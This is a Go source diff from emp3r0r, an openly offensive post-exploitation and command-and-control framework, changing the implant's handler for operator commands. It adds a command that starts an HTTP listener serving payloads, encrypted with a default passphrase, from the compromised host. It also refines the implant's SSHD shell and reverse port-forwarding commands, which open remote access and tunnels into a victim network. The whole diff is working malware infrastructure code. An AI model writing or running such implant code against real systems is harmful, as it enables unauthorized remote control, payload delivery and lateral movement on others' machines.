@@ -9,6 +9,7 @@ import (
 	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/listener"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/pflag"
@@ -96,19 +97,30 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			return
 		}
 		log.Printf("Got sshd request: %s", cmdSlice)
+
+		errChan := make(chan error)
+
 		go func() {
-			out = "success"
-			err = SSHD(*shell, *port, *args)
-			if err != nil {
-				out = fmt.Sprintf("Error: %v", err)
-			}
+			errChan <- SSHD(*shell, *port, *args)
 		}()
+
 		for !tun.IsPortOpen("127.0.0.1", *port) {
 			time.Sleep(100 * time.Millisecond)
 			if err != nil {
 				out = fmt.Sprintf("Error: sshd failed to start: %v\n%s", err, out)
 				break
 			}
+		}
+
+		select {
+		case err = <-errChan:
+			if err != nil {
+				out = fmt.Sprintf("Error: %v", err)
+			} else {
+				out = "success"
+			}
+		case <-time.After(3 * time.Second):
+			out = "SSHD started successfully"
 		}
 		return
 
@@ -148,6 +160,9 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			return
 		}
 		out = "success"
+
+		errChan := make(chan error)
+
 		switch *operation {
 		case "stop":
 			pf, exist := PortFwds[*sessionID]
@@ -159,18 +174,21 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			out = fmt.Sprintf("Error: port mapping %s not found", pf.Addr)
 		case "reverse":
 			go func() {
-				err = PortFwd(*to, *sessionID, "tcp", true, 0)
-				if err != nil {
-					out = fmt.Sprintf("Error: PortFwd (reverse) failed: %v", err)
-				}
+				errChan <- PortFwd(*to, *sessionID, "tcp", true, 0)
 			}()
 		default:
 			go func() {
-				err = PortFwd(*to, *sessionID, *operation, false, *timeout)
-				if err != nil {
-					out = fmt.Sprintf("Error: PortFwd failed: %v", err)
-				}
+				errChan <- PortFwd(*to, *sessionID, *operation, false, *timeout)
 			}()
+		}
+
+		select {
+		case err = <-errChan:
+			if err != nil {
+				out = fmt.Sprintf("Error: %v", err)
+			}
+		case <-time.After(3 * time.Second):
+			out = "Port forwarding started successfully"
 		}
 		return
 
@@ -226,6 +244,44 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			return
 		}
 		out = Upgrade(*checksum)
+		return
+
+	// !listener --listener listener --port port --payload payload --compression on/off --passphrase passphrase
+	case emp3r0r_data.C2CmdListener:
+		listener_type := flags.StringP("listener", "l", "http_aes_compressed", "Listener")
+		port := flags.StringP("port", "p", "8000", "Port")
+		payload := flags.StringP("payload", "P", "", "Payload")
+		compression := flags.StringP("compression", "c", "on", "Compression")
+		passphrase := flags.StringP("passphrase", "s", "my_secret_key", "Passphrase")
+		flags.Parse(cmdSlice[1:])
+
+		if *payload == "" {
+			out = fmt.Sprintf("Error: payload not specified: %v", cmdSlice)
+			return
+		}
+		log.Printf("Got listener request: %v", cmdSlice)
+
+		errChan := make(chan error)
+
+		if *listener_type == "http_aes_compressed" {
+			go func() {
+				errChan <- listener.HTTPAESCompressedListener(*payload, *port, *passphrase, *compression == "on")
+			}()
+		}
+		if *listener_type == "http_bare" {
+			go func() {
+				errChan <- listener.HTTPBareListener(*payload, *port)
+			}()
+		}
+
+		select {
+		case err = <-errChan:
+			if err != nil {
+				out = fmt.Sprintf("Error: %v", err)
+			}
+		case <-time.After(3 * time.Second):
+			out = "Listener started successfully"
+		}
 		return
 
 	default:
